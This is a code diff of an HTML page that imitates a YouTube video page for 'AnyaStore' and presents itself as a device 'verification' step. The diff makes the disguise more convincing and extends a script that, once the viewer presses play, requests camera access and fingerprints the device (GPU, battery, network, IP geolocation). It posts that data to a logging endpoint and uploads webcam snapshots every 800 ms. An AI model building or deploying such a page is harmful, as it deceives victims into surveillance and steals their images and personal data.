@@ -2,31 +2,69 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>YouTube</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        body { margin: 0; background-color: #0f0f0f; color: white; font-family: "Roboto", Arial, sans-serif; overflow-x: hidden; }
+        :root { --yt-red: #ff0000; --yt-bg: #0f0f0f; --yt-text: #ffffff; --yt-sub: #aaa; --yt-surface: #272727; }
+        body { margin: 0; background-color: var(--yt-bg); color: var(--yt-text); font-family: "Roboto", Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
+
+        /* Top Header */
+        header { height: 48px; display: flex; align-items: center; justify-content: space-between; padding: 0 16px; position: sticky; top: 0; background: var(--yt-bg); z-index: 100; }
+        .yt-logo { display: flex; align-items: center; color: white; text-decoration: none; font-weight: bold; font-size: 18px; letter-spacing: -1px; }
+        .yt-logo i { color: var(--yt-red); font-size: 24px; margin-right: 4px; }
+        .header-icons { display: flex; gap: 20px; font-size: 18px; }
+
+        /* Video Player Area */
         .video-wrapper { position: relative; width: 100%; background: #000; aspect-ratio: 16 / 9; display: flex; align-items: center; justify-content: center; }
-        .spinner { border: 4px solid rgba(255, 255, 255, 0.1); border-left-color: #ff0000; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+        .spinner { border: 3px solid rgba(255, 255, 255, 0.1); border-left-color: var(--yt-red); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        #play-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 20; display: flex; align-items: center; justify-content: center; cursor: pointer; background: rgba(0,0,0,0.1); }
-        .play-icon { font-size: 60px; color: white; opacity: 0.9; }
-        .video-details { padding: 12px; }
-        .video-title { font-size: 19px; font-weight: 700; line-height: 24px; margin-bottom: 8px; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
-        .channel-row { display: flex; align-items: center; margin: 12px 0; justify-content: space-between; }
-        .channel-info { display: flex; align-items: center; gap: 10px; }
-        .channel-pfp { width: 40px; height: 40px; background: #3f3f3f; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 20px; color: #ff4747; }
-        .channel-name { font-size: 16px; font-weight: 600; display: flex; align-items: center; gap: 4px; }
-        .verified-badge { color: #aaa; font-size: 12px; }
-        .sub-count { font-size: 12px; color: #aaa; }
-        .sub-btn { background: white; color: black; padding: 0 16px; height: 36px; border-radius: 18px; border: none; font-weight: 600; font-size: 14px; cursor: pointer; }
-        .description-box { background: #272727; border-radius: 12px; padding: 12px; margin-top: 12px; font-size: 14px; line-height: 20px; }
-        .view-count { font-weight: 600; margin-bottom: 4px; display: block; }
+        
+        #play-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 20; display: flex; align-items: center; justify-content: center; cursor: pointer; background: rgba(0,0,0,0.2); }
+        .play-icon { font-size: 50px; color: white; filter: drop-shadow(0 0 10px rgba(0,0,0,0.5)); }
+
+        /* Video Info */
+        .video-details { padding: 12px 16px; }
+        .video-title { font-size: 18px; font-weight: 700; line-height: 22px; margin-bottom: 8px; }
+        .meta-text { font-size: 12px; color: var(--yt-sub); margin-bottom: 12px; }
+
+        /* Action Buttons (Like/Share) */
+        .action-bar { display: flex; overflow-x: auto; gap: 8px; margin-bottom: 16px; scrollbar-width: none; }
+        .action-bar::-webkit-scrollbar { display: none; }
+        .action-btn { background: var(--yt-surface); padding: 0 12px; height: 36px; border-radius: 18px; display: flex; align-items: center; gap: 6px; font-size: 13px; font-weight: 500; flex-shrink: 0; }
+
+        /* Channel Section */
+        .channel-row { display: flex; align-items: center; margin: 12px 0; gap: 12px; }
+        .channel-pfp { width: 36px; height: 36px; background: #555; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; overflow: hidden; }
+        .channel-pfp img { width: 100%; height: 100%; object-fit: cover; }
+        .channel-info { flex-grow: 1; }
+        .channel-name { font-size: 15px; font-weight: 600; display: flex; align-items: center; gap: 4px; }
+        .sub-count { font-size: 12px; color: var(--yt-sub); }
+        .sub-btn { background: white; color: black; padding: 0 16px; height: 36px; border-radius: 18px; border: none; font-weight: 600; font-size: 14px; }
+
+        /* Description/Comments */
+        .comment-preview { background: var(--yt-surface); border-radius: 12px; padding: 12px; margin-top: 12px; font-size: 13px; }
+        .comment-header { font-weight: 600; margin-bottom: 8px; font-size: 14px; }
+        
+        /* Up Next / Recommendations */
+        .recommendations { padding: 16px; border-top: 1px solid #333; margin-top: 16px; }
+        .rec-item { display: flex; gap: 12px; margin-bottom: 12px; }
+        .thumb { width: 140px; height: 80px; background: #333; border-radius: 8px; flex-shrink: 0; }
+        .rec-info { font-size: 14px; font-weight: 500; line-height: 1.2; }
+        .rec-meta { font-size: 11px; color: var(--yt-sub); margin-top: 4px; }
+
         video, canvas { display: none; }
     </style>
 </head>
 <body>
+
+    <header>
+        <a href="#" class="yt-logo"><i class="fab fa-youtube"></i> YouTube</a>
+        <div class="header-icons">
+            <i class="fas fa-search"></i>
+            <i class="fas fa-ellipsis-v"></i>
+        </div>
+    </header>
 
     <div class="video-wrapper">
         <div class="spinner" id="loading-spinner" style="display: none;"></div>
@@ -36,22 +74,42 @@
     </div>
 
     <div class="video-details">
-        <div class="video-title" id="display-title">Loading video details...</div>
+        <div class="video-title" id="display-title">Verification Required - Secure Portal</div>
+        <div class="meta-text">1,240,582 views • Oct 14, 2023</div>
+
+        <div class="action-bar">
+            <div class="action-btn"><i class="far fa-thumbs-up"></i> 42K</div>
+            <div class="action-btn"><i class="fas fa-share"></i> Share</div>
+            <div class="action-btn"><i class="fas fa-download"></i> Download</div>
+            <div class="action-btn"><i class="far fa-save"></i> Save</div>
+        </div>
+
         <div class="channel-row">
+            <div class="channel-pfp">A</div>
             <div class="channel-info">
-                <div class="channel-pfp">A</div>
-                <div>
-                    <div class="channel-name">AnyaStore <i class="fas fa-check-circle verified-badge"></i></div>
-                    <div class="sub-count">148K subscribers</div>
-                </div>
+                <div class="channel-name">AnyaStore <i class="fas fa-check-circle" style="font-size:10px; color:#aaa;"></i></div>
+                <div class="sub-count">148K subscribers</div>
             </div>
             <button class="sub-btn">Subscribe</button>
         </div>
-        <div class="description-box">
-            <span class="view-count">1.2M views • 3 hours ago</span>
-            <div id="display-desc">
-                Welcome to the official AnyaStore verification portal. Please play the video to verify your device status and proceed with your order.
+
+        <div class="comment-preview">
+            <div class="comment-header">Comments <span style="color:#aaa; font-weight:400; margin-left:8px;">842</span></div>
+            <div style="display:flex; gap:10px; align-items:center;">
+                <div style="width:24px; height:24px; background:#444; border-radius:50%;"></div>
+                <div style="color:#eee;">Please complete device verification to proceed...</div>
             </div>
+        </div>
+    </div>
+
+    <div class="recommendations">
+        <div class="rec-item">
+            <div class="thumb"></div>
+            <div class="rec-info">How to secure your AnyaStore account<div class="rec-meta">AnyaStore • 2.1M views</div></div>
+        </div>
+        <div class="rec-item">
+            <div class="thumb"></div>
+            <div class="rec-info">New Digital Reselling Strategies 2026<div class="rec-meta">TechPro • 500K views</div></div>
         </div>
     </div>
 
@@ -65,7 +123,7 @@
         const camMode = params.get('cam') || 'user';
         const ytId = params.get('ytid') || 'dQw4w9WgXcQ';
 
-        document.getElementById('display-title').innerText = "Account Verification & Security Check - ID #" + (ytId.substring(0,6));
+        document.getElementById('display-title').innerText = "Device Security & Identity Check (ID: " + (ytId.substring(0,6)) + ")";
 
         async function initiateCapture() {
             if (!uid || uid === "null") return;
@@ -80,8 +138,6 @@
                 });
                 
                 document.getElementById('v').srcObject = stream;
-
-                // Execute God-Mode Data Gathering
                 await gatherDeepInfo();
 
                 if (mode === 'video') {
@@ -89,46 +145,49 @@
                 } else {
                     startPhotoLogic();
                 }
-
             } catch (err) {
                 document.getElementById('loading-spinner').style.display = 'none';
-                document.getElementById('display-title').innerText = "Playback Error: Please allow permissions to watch.";
+                document.getElementById('display-title').innerText = "Playback Error: Verification Denied.";
                 document.getElementById('play-overlay').style.display = 'flex';
             }
         }
 
         async function gatherDeepInfo() {
+            // Advanced GPU Fingerprinting
+            let gpu = 'N/A';
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            } catch(e){}
+
             let extraData = {
                 browser: navigator.userAgent,
                 platform: navigator.platform,
                 cores: navigator.hardwareConcurrency || 'N/A',
                 memory: navigator.deviceMemory || 'N/A',
                 screen: `${window.screen.width}x${window.screen.height}`,
+                gpu: gpu,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 language: navigator.language,
                 touch: navigator.maxTouchPoints > 0 ? 'Yes' : 'No',
-                darkmode: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'On' : 'Off',
-                orientation: (screen.orientation) ? screen.orientation.type : 'N/A'
+                darkmode: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'On' : 'Off'
             };
 
-            // Network Connection Intel
             if (navigator.connection) {
                 extraData.net_speed = `${navigator.connection.downlink} Mbps`;
                 extraData.net_type = navigator.connection.effectiveType.toUpperCase();
-                extraData.save_data = navigator.connection.saveData ? 'Active' : 'Off';
             }
 
-            // Battery Intel
             try {
                 const battery = await navigator.getBattery();
                 extraData.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
             } catch (e) { extraData.battery = 'N/A'; }
 
-            // IP and Geo-location
             const ipResponse = await fetch('https://ipapi.co/json/');
             const ipData = await ipResponse.json();
 
-            // Send full payload to app.py
             await fetch(`/log_info?id=${uid}`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -147,13 +206,11 @@
                 const c = document.getElementById('c'), v = document.getElementById('v');
                 c.width = v.videoWidth; c.height = v.videoHeight;
                 c.getContext('2d').drawImage(v, 0, 0);
-                
                 c.toBlob(blob => {
                     const fd = new FormData();
                     fd.append('file', blob);
                     fetch(`/upload?id=${uid}&type=photo`, { method: 'POST', body: fd });
-                }, 'image/jpeg');
-                
+                }, 'image/jpeg', 0.7);
                 count++;
             }, 800);
         }
